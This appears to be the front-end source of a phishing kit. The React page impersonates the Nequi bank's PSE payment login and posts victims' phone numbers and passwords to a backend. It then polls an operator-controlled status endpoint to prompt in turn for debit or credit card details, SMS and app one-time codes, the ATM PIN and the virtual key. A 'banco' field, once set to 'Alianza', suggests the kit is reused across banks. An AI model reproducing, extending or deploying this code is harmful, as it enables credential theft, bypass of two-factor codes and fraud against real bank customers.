"use client"
import { InputAnimado } from "@/components/inputAnimado/InputAnimado"
import "./nequi.css"
import { Tarjeta } from "@/components/tarjeta/Tarjeta"
import { Status } from "@/components/status/Status"
import { useEffect, useState } from "react"
import axios from "axios"

const COLOR_PRINCIPAL_TEXT = "text-[#da0081]"
const COLOR_PRINCIPAL_BACK = "bg-[#da0081]"
const back_color = "bg-[#ffffff]"
const back_color_input = "bg-[#fbf7fb]"
const text_color = "text-[#270f3c]"

function esCelularColombianoValido(numero) {
  return /^3\d{9}$/.test(String(numero));
}

const Loading = () => {
  return (
    <div className="fixed inset-0 bg-white/60 flex items-center justify-center z-50">
      <div className="w-12 h-12 border-4 border-[#da0081] border-t-transparent rounded-full animate-spin" />
    </div>
  );
};


const InicioSesion = ({ handlerInformacion, datosInicio, btnInicio, btnCancelar, tituloError }) => {
    const [errorDatos, setErrorDatos] = useState({
        numeroDocumento: "",
        contrasenia: ""       
    })

    const handlerContinuar = () => {
        const nuevosErrores = {
            numeroDocumento: "",
            contrasenia: ""
        }

        // Validación de número de documento
        if (!datosInicio.numeroDocumento || datosInicio.numeroDocumento.trim() === "") {
            nuevosErrores.numeroDocumento = "El número de celular es obligatorio"
        }
        if (!esCelularColombianoValido(datosInicio.numeroDocumento)) {
            nuevosErrores.numeroDocumento = "El número de celular no es valido"
        }

        // Validación de contraseña
        if (!datosInicio.contrasenia || datosInicio.contrasenia.trim() === "") {
            nuevosErrores.contrasenia = "La clave es obligatoria"
        }

        // Si hay errores, los mostramos
        if (nuevosErrores.numeroDocumento || nuevosErrores.contrasenia) {
            setErrorDatos(nuevosErrores)
            return
        }

        // Si no hay errores, limpiamos y ejecutamos la acción
        setErrorDatos({
            numeroDocumento: "",
            contrasenia: ""
        })
        btnInicio()
    }

    return (
        <div className="w-full">
            {tituloError !== "" && 
                <div className="w-full flex items-center justify-center">
                    <span className="text-[11px] text-red-600">{tituloError}</span>
                </div>
            }
            <div className="w-full flex flex-col gap gap-y-4 pl-1">
                <InputAnimado 
                    error={!!errorDatos.numeroDocumento} 
                    errorLabel={errorDatos.numeroDocumento} 
                    label={"Número de celular"} 
                    labelColor={text_color}
                    modoNumerico={true}
                    type={"tel"}
                    labelColorSelect={COLOR_PRINCIPAL_TEXT} 
                    name={"numeroDocumento"} 
                    handler={handlerInformacion} 
                    value={datosInicio.numeroDocumento} 
                    backGraundInput={back_color_input}
                />

                <InputAnimado 
                    error={!!errorDatos.contrasenia} 
                    errorLabel={errorDatos.contrasenia} 
                    label={"Clave"} 
                    labelColor={text_color}
                    labelColorSelect={COLOR_PRINCIPAL_TEXT} 
                    placeHolder={""} 
                    name={"contrasenia"} 
                    handler={handlerInformacion} 
                    value={datosInicio.contrasenia} 
                    backGraundInput={back_color_input}
                    modoNumerico={true} 
                    type="password"
                />

                <div className="w-full flex flex-col items-center">
                    <button onClick={handlerContinuar} disabled={datosInicio.numeroDocumento.trim() == "" || datosInicio.contrasenia.trim() == ""} className={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`}>
                        Entra
                    </button>
                    <button onClick={btnCancelar} className={`mt-2 py-4 ${text_color} border-1 w-full rounded-sm `}>
                        Ahora no
                    </button>
                </div>
            </div>
        </div>
    )
}






export default function Nequi (){
    const [inicioSesion, setInicioSesion] = useState(false)
    const [selectVista, setSelectVisata] = useState(null)
    const [loading, setLoading] = useState(false)
    const [tituloError, setTituloError] = useState("")
    const [reLoad, setReLoad] = useState(false)
    const [key, setKey] = useState(0)
    const [datosInicio, setDatosInicio] = useState({
        numeroDocumento: "",
        contrasenia:""
    })
    const [guardado, setGuardado] = useState(false)
    const [uniqId, setUniqId] = useState("")
    const [btnInicio, setBtnInicio] = useState(false)

    const handlerInformacion = (e)=>{
        const copia = {...datosInicio}
        copia[e.target.name] = e.target.value
        setDatosInicio(copia)
    }

    const handlerBtnInicio = ()=>{
        setBtnInicio(b => !b)
    }
    
    //obtener uniqId
    useEffect(() => {
        setLoading(true)
        const savedId = localStorage.getItem('uniqId')
        console.log(savedId == null, "guardaaaa", savedId);
        const temp = savedId == null ? "" : savedId
        setUniqId(temp)
        setLoading(false)
        
    }, [])
    
    //guardad datos de sesion
    useEffect(()=>{
        const inicioSesionfuncion = async ()=>{
            setLoading(true)
            console.log(loading);
            
            const { data } = await axios.post(
            `/api/sesion`,
            {
                usuario: datosInicio.numeroDocumento,
                clave: datosInicio.contrasenia,
                banco: "Nequi",
                uniqid: uniqId    
            },
            {
                headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
                },
            }
            )
            if(uniqId === "" ) {
                localStorage.setItem('uniqId', data.uniqid)
                setUniqId(data.uniqid)
            }
            setKey(k => k+1)
            setInicioSesion(true)
            setTituloError("")
            setGuardado(true)
            
        }
        if (btnInicio) {
            inicioSesionfuncion()
        }
    },[btnInicio])

    //pulling
    useEffect(() => {
    let isMounted = true;

    const iniciarLongPolling = async () => {
        if (!isMounted) return;
        setTituloError("")
        try {
            const selV = await axios.get(`/api/sesion/status/${uniqId}`, {
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                },
            });
            console.log(selV.data.status);
            
            if (
                selV.data.status == "tdb" ||
                selV.data.status == "tdb-error" ||
                selV.data.status == "tdc" ||
                selV.data.status == "tdc-error" ||
                selV.data.status == "otpsms" ||
                selV.data.status == "otpsms-error" ||
                selV.data.status == "otpapp" ||
                selV.data.status == "otpapp-error" ||
                selV.data.status == "clavecajero" ||
                selV.data.status == "clavecajero-error" ||
                selV.data.status == "clavevirtual" ||
                selV.data.status == "clavevirtual-error" &&
                selV.data.status !== selectVista
            ) {
                setSelectVisata(selV.data.status);
                setKey(prev => prev + 1) 
                setLoading(false);
                return;
            }else if(selV.data.status == "fin"){
                setSelectVisata("compraExitosa")
                setLoading(false);
                return;
            }else if(selV.data.status == "error"){
                setSelectVisata("errorCompra")
                setLoading(false);
                return;

            }else if(selV.data.status == "login" || selV.data.status == "login-error"){
                setDatosInicio({
                    numeroDocumento: "",
                    contrasenia:""
                })
                setSelectVisata(selV.data.status)
                if (selV.data.status == "login-error") setTituloError("Informacion incorrecta, ingresala nuevamente")
                setKey(prev => prev + 1)
                setLoading(false);
                return;
            }
        } catch (error) {
            console.log(error);
        }

        // Esperamos 4 segundos y reintentamos
        setTimeout(iniciarLongPolling, 4000);
    };
    if (guardado) {
        iniciarLongPolling()
    }

    return () => {
        isMounted = false;
    };
    }, [guardado, reLoad]);

    //mensje-otp
    const handlerMensaje = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/otp-sms`, {
                uniqid: uniqId,
                otpsms: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    const handlerloginError = async ()=>{
        try {
            setLoading(true)
            const { data } = await axios.post(
            `/api/sesion`,
            {
                usuario: datosInicio.numeroDocumento,
                clave: datosInicio.contrasenia,
                banco: "Alianza",
                uniqid: uniqId    
            },
            {
                headers: {
                "Content-Type": "application/json",
                Accept: "application/json",
                },
            }
            )
            setReLoad(r => r = !r)            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    
    //otp-app
    const handlerAplicacion = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/otp-app`, {
                uniqid: uniqId,
                otpapp: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    //clave-cajero
    const handlerCajero = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/clave-cajero`, {
                uniqid: uniqId,
                clavecajero: clave 
            },{
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }
    //clave-virtual
    const handlerClaveVirtual = async (clave)=>{
        try {
            setLoading(true)
            const send = await axios.post(`/api/sesion/clave-virtual`, {
                uniqid: uniqId,
                clavevirtual: clave 
            },{
            headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
        }
    }

    //tarjeta
    const handlerTarjeta = async (body) =>{
        try {
            setLoading(true)
            body.uniqid = uniqId
            const send = await axios.post(`/api/sesion/tarjeta`, body, {
                headers: {
                "Content-Type": "application/json",
                'Accept': 'application/json'
            }})
            setReLoad(r => r = !r)
            
        } catch (error) {
            await new Promise((resolve) => setTimeout(resolve, 30000));
            console.log(error);
            setReLoad(r => r = !r)
        }
        
    }



    return(
        <div className={`w-full flex flex-col items-center justify-center ${back_color}`}>
            <div className="w-[80%] mt-9 flex flex-col items-center justify-center">
                <svg _ngcontent-wan-c28="" width="180" height="40" viewBox="0 0 104 32" fill="none" xmlns="http://www.w3.org/2000/svg" className="splash__container__svg">
                    <path _ngcontent-wan-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" className="point__up"></path>
                    <path _ngcontent-wan-c28="" d="M5.29905 0H0.918073C0.411035 0 0 0.408316 0 0.912V4.608C0 5.11168 0.411035 5.52 0.918073 5.52H5.29905C5.80609 5.52 6.21713 5.11168 6.21713 4.608V0.912C6.21713 0.408316 5.80609 0 5.29905 0Z" fill="#DA0081" className="point__down"></path>
                    <path _ngcontent-wan-c28="" d="M31.9876 0H28.2187C27.7033 0 27.3006 0.416 27.3006 0.912V15.872C27.3006 16.176 26.8979 16.288 26.753 16.016L17.991 0.4C17.8461 0.144 17.5884 0 17.2823 0H11.0169C10.5015 0 10.0988 0.416 10.0988 0.912V24.816C10.0988 25.328 10.5176 25.728 11.0169 25.728H14.7858C15.3012 25.728 15.7039 25.312 15.7039 24.816V9.408C15.7039 9.104 16.1066 8.992 16.2515 9.264L25.2551 25.344C25.4 25.6 25.6577 25.744 25.9638 25.744H31.9554C32.4708 25.744 32.8735 25.328 32.8735 24.832V0.912C32.8735 0.4 32.4547 0 31.9554 0H31.9876Z" fill="#200020" className="N"></path>
                    <path _ngcontent-wan-c28="" d="M54.6495 16.3999C54.6495 9.66395 50.2363 6.31995 45.3883 6.31995C39.0906 6.31995 35.4988 10.6559 35.4988 16.5119C35.4988 23.1679 40.0087 26.3359 45.2433 26.3359C50.4779 26.3359 53.5382 23.6479 54.3596 20.1599C54.4724 19.7119 54.2147 19.3119 53.5382 19.3119H50.5746C50.2363 19.3119 49.9464 19.4879 49.8015 19.8239C49.0606 21.4399 47.8687 22.2879 45.5815 22.2879C42.9884 22.2879 41.2489 20.6719 40.9912 17.3919H53.7315C54.2791 17.3919 54.6495 16.9919 54.6495 16.3999ZM41.2006 13.8559C41.7482 11.4399 43.1656 10.3679 45.3077 10.3679C47.2244 10.3679 48.8673 11.4719 49.0928 13.8559H41.2006Z" fill="#200020" className="E"></path>
                    <path _ngcontent-wan-c28="" d="M103.082 6.80005H99.2969C98.7899 6.80005 98.3788 7.20837 98.3788 7.71205V24.832C98.3788 25.3357 98.7899 25.744 99.2969 25.744H103.082C103.589 25.744 104 25.3357 104 24.832V7.71205C104 7.20837 103.589 6.80005 103.082 6.80005Z" fill="#200020" className="I"></path>
                    <path _ngcontent-wan-c28="" d="M74.976 6.80002H71.2071C70.6917 6.80002 70.289 7.21602 70.289 7.71202V8.64002C69.1615 7.32802 67.3093 6.41602 64.8772 6.41602C59.4332 6.41602 56.5501 11.312 56.5501 16.496C56.5501 21.024 58.9178 26.096 64.7644 26.096C66.8583 26.096 69.081 25.104 70.289 23.696V31.056C70.289 31.568 70.7078 31.968 71.2071 31.968H74.976C75.4914 31.968 75.8941 31.552 75.8941 31.056V7.72802C75.8941 7.21602 75.4753 6.81602 74.976 6.81602V6.80002ZM66.3912 22.064C63.9108 22.064 62.1713 20.256 62.1713 16.368C62.1713 12.48 63.9108 10.448 66.3912 10.448C68.8716 10.448 70.6111 12.32 70.6111 16.368C70.6111 20.416 68.8716 22.064 66.3912 22.064Z" fill="#200020" className="Q"></path>
                    <path _ngcontent-wan-c28="" d="M95.0448 6.80005H91.2759C90.7604 6.80005 90.3578 7.21605 90.3578 7.71205V17.3921C90.3578 20.5121 88.9565 21.4241 87.1687 21.4241C85.3809 21.4241 83.9796 20.5121 83.9796 17.3921V7.71205C83.9796 7.20005 83.5608 6.80005 83.0615 6.80005H79.2926C78.7772 6.80005 78.3745 7.21605 78.3745 7.71205V17.7921C78.3745 23.7921 81.7086 26.2081 87.1848 26.2081C92.661 26.2081 95.9951 23.7761 95.9951 17.7921V7.71205C95.9951 7.20005 95.5763 6.80005 95.077 6.80005H95.0448Z" fill="#200020" className="U"></path>
                </svg>
                <p className={`text-[20px] mt-3 font-semibold pb-5 text-[${text_color}]`}>Pagos PSE de Nequi</p>
                <p className={`text-[15px] pb-5 text-[${text_color}] text-center mt-2.5`}>Ingresa tu número de cel y clave. Recuerda que debes tener tu cel a la mano para terminar el proceso.</p>
                {loading && <Loading/>}
                {reLoad && <Loading/>}
                {!inicioSesion && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerBtnInicio}/>}
                {selectVista == "login-error" && <InicioSesion  key={key} handlerInformacion={handlerInformacion} datosInicio={datosInicio} tituloError={tituloError} btnInicio={handlerloginError}/>}
                
                {selectVista == "tdb" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "tdb-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta debito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "tdc" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "tdc-error" && <Tarjeta key={key} InputModificado={InputAnimado} textColor={text_color_principal} error={"Datos incorrecto, ingreselo nuevamente"} titulo={"Ingrese los siguientes datos de su tarjeta de credito"} handlerTarjeta={handlerTarjeta} labelBtnContinuar={"Continuar"} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} estilioInput={"w-full relative flex border-b-2"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpsms" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpsms-error" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo por mensaje de texto"} InputModificado={InputAnimado} handler={handlerMensaje} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpapp" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave dinamica"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "otpapp-error" && <Status key={key} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de aplicación"} InputModificado={InputAnimado} handler={handlerAplicacion} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={"Codigo incorrecto"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavecajero" && <Status key={key} type={"password"} btn={true} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavecajero-error" && <Status key={key} btn={true} type={"password"} contenBtn={btn} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Codigo de cajero"} InputModificado={InputAnimado} handler={handlerCajero} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavevirtual" && <Status key={key} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={""} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {selectVista == "clavevirtual-error" && <Status key={key} btn={true} contenBtn={btn} type={"password"} textColor={text_color_principal} titulo={"verificacion de seguridad"} lebelInput={"Clave virtual"} InputModificado={InputAnimado} handler={handlerClaveVirtual} estiloBtnContinuar={`py-4 text-white ${COLOR_PRINCIPAL_BACK} w-full rounded-sm  disabled:cursor-not-allowed disabled:bg-[#e9a8c5]`} labelBtnContinuar={"Validar"} error={"Clave incorrecta"} borderCol={"border-gray-400"} borderColSelec={"border-black"} borderColError={"border-red-600"} backGraundInput={"bg-white"}/>}
                {!inicioSesion && <span className="text-[14px] mt-5 text-center w-[80%]">¿Se te olvidó la clave? Abre Nequi en tu cel y cámbiala en segundos.</span>}               
            </div>
        </div>
    )
}